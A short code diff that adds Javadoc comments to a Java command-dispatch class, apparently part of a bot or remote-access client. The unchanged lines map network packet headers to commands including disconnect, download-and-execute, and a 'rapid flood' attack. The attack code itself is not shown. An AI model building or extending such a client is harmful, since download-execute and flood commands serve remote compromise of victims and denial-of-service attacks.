@@ -8,8 +8,14 @@ import com.redpois0n.common.packets.Headers;
 
 public class Commands {
 	
+	/**
+	 * Command map
+	 */
 	public static final Map<Byte, Class<? extends Command>> commands = new HashMap<Byte, Class<? extends Command>>();
 	
+	/**
+	 * Loads commands
+	 */
 	static {
 		commands.put(Headers.PACKET_DISCONNECT, CommandDisconnect.class);
 		commands.put(Headers.PACKET_DOWNLOAD_EXECUTE, CommandDownload.class);
@@ -22,7 +28,12 @@ public class Commands {
 		commands.put(Headers.PACKET_RAPID_FLOOD, CommandRapid.class);
 	}
 
-	public static void execute(byte b) throws Exception{
+	/**
+	 * Executes command from byte
+	 * @param b
+	 * @throws Exception if no class is found
+	 */
+	public static void execute(byte b) throws Exception {
 		commands.get(b).newInstance().perform();
 	}
 
